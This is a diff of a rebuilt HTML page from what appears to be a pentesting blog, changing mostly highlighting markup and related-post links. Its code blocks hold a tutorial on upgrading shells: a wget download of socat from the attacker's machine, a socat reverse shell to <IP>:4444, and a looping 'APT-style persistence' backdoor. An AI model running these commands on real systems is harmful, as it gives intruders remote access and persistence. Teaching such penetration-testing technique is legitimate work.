@@ -93,7 +93,7 @@
 <script>$(document).on('click', function () { $('.collapse').collapse('hide'); })</script>
 
 
-<script src="/js/confetti.browser.js"></script> <meta name="generator" content="Hugo 0.85.0" />
+<script src="/js/confetti.browser.js"></script> <meta name="generator" content="Hugo 0.96.0" />
     
 
     
@@ -304,13 +304,13 @@
 <li>Get the <code>nc</code> shell.</li>
 <li>In the shell, execute:</li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/sh&#34;)&#39;</span>
-</code></pre></div><p>to allocate a TTY in the <code>nc</code> session.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/sh&#34;)&#39;</span>
+</span></span></code></pre></div><p>to allocate a TTY in the <code>nc</code> session.</p>
 <ol start="4">
 <li>Execute</li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">export TERM<span style="color:#f92672">=</span>xterm-256color
-</code></pre></div><p>for proper color support.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>export TERM<span style="color:#f92672">=</span>xterm-256color
+</span></span></code></pre></div><p>for proper color support.</p>
 <ol start="5">
 <li>Put the shell into background using CTRL+Z.</li>
 <li>Configure the local shell using <code>stty raw -echo</code>.</li>
@@ -328,18 +328,18 @@
 <p><strong>The <code>wget</code> method:</strong></p>
 <p>a) Attacker: <code>cd</code> into the folder containing the binary and execute <code>python -m SimpleHTTPServer &lt;PORT&gt;</code>.</p>
 <p>b) Use</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cd /tmp <span style="color:#f92672">&amp;&amp;</span> wget http://&lt;IP&gt;:&lt;PORT&gt;/socat
-</code></pre></div><p>to download the file from the attackers machine.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd /tmp <span style="color:#f92672">&amp;&amp;</span> wget http://&lt;IP&gt;:&lt;PORT&gt;/socat
+</span></span></code></pre></div><p>to download the file from the attackers machine.</p>
 <p>After that, it&rsquo;s time to spawn the shell:</p>
 <ol>
 <li>Create a <code>socat</code> listener on the attacking machine with</li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">socat file:<span style="color:#e6db74">`</span>tty<span style="color:#e6db74">`</span>,raw,echo<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> tcp-listen:4444
-</code></pre></div><ol start="2">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>socat file:<span style="color:#e6db74">`</span>tty<span style="color:#e6db74">`</span>,raw,echo<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> tcp-listen:4444
+</span></span></code></pre></div><ol start="2">
 <li>Spawn a proper reverse shell from the <code>nc</code> shell on the victims box using:</li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">socat exec:<span style="color:#e6db74">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,sane tcp:&lt;IP&gt;:4444
-</code></pre></div><h1 id="fixing-width">Fixing width</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>socat exec:<span style="color:#e6db74">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,sane tcp:&lt;IP&gt;:4444
+</span></span></code></pre></div><h1 id="fixing-width">Fixing width</h1>
 <p>In case the with of the shell is too small, it can be fixed like this:</p>
 <ol>
 <li>Using a new terminal, execute <code>stty -a</code> to display the amount of columns and rows being used normally on the attackers machine.</li>
@@ -347,8 +347,8 @@
 </ol>
 <h1 id="apt-style-persistence">APT-style persistence</h1>
 <p>Create a lazy backdoor shell on the victims machine:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#66d9ef">while</span> true; <span style="color:#66d9ef">do</span> sleep 10; socat exec:<span style="color:#e6db74">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,sane tcp:&lt;IP&gt;:&lt;PORT&gt;; <span style="color:#66d9ef">done</span> &amp;
-</code></pre></div><p>In case a previous shell breaks, just set up a new listener to be up and running again without the need to run an exploit again. Or use <a href="https://github.com/creaktive/tsh">tsh</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#66d9ef">while</span> true; <span style="color:#66d9ef">do</span> sleep 10; socat exec:<span style="color:#e6db74">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,sane tcp:&lt;IP&gt;:&lt;PORT&gt;; <span style="color:#66d9ef">done</span> &amp;
+</span></span></code></pre></div><p>In case a previous shell breaks, just set up a new listener to be up and running again without the need to run an exploit again. Or use <a href="https://github.com/creaktive/tsh">tsh</a></p>
 </div>
 
     
@@ -359,6 +359,25 @@
     <h4 id="related" class="page-header">Related</h4>
 
      <div class="item">
+
+    
+    
+    
+
+    
+
+    <h4><a href="/post/yt/">This Weird YouTube Trick</a></h4>
+    <h5></h5>
+    
+    <a href="https://bananamafia.dev/tags/python"><kbd class="item-tag">python</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/programming"><kbd class="item-tag">programming</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/shell"><kbd class="item-tag">shell</kbd></a>
+    
+
+</div>
+  <div class="item">
 
     
     
@@ -391,31 +410,6 @@
     <a href="https://bananamafia.dev/tags/pentesting"><kbd class="item-tag">pentesting</kbd></a>
     
     <a href="https://bananamafia.dev/tags/python"><kbd class="item-tag">python</kbd></a>
-    
-
-</div>
-  <div class="item">
-
-    
-    
-    
-
-    
-
-    <h4><a href="/post/pairprog/">Random Note #12354123: Easy Remote Pair Programming Using Docker and Tmux</a></h4>
-    <h5></h5>
-    
-    <a href="https://bananamafia.dev/tags/randomnote"><kbd class="item-tag">randomnote</kbd></a>
-    
-    <a href="https://bananamafia.dev/tags/docker"><kbd class="item-tag">docker</kbd></a>
-    
-    <a href="https://bananamafia.dev/tags/vim"><kbd class="item-tag">vim</kbd></a>
-    
-    <a href="https://bananamafia.dev/tags/tmux"><kbd class="item-tag">tmux</kbd></a>
-    
-    <a href="https://bananamafia.dev/tags/shell"><kbd class="item-tag">shell</kbd></a>
-    
-    <a href="https://bananamafia.dev/tags/programming"><kbd class="item-tag">programming</kbd></a>
     
 
 </div>
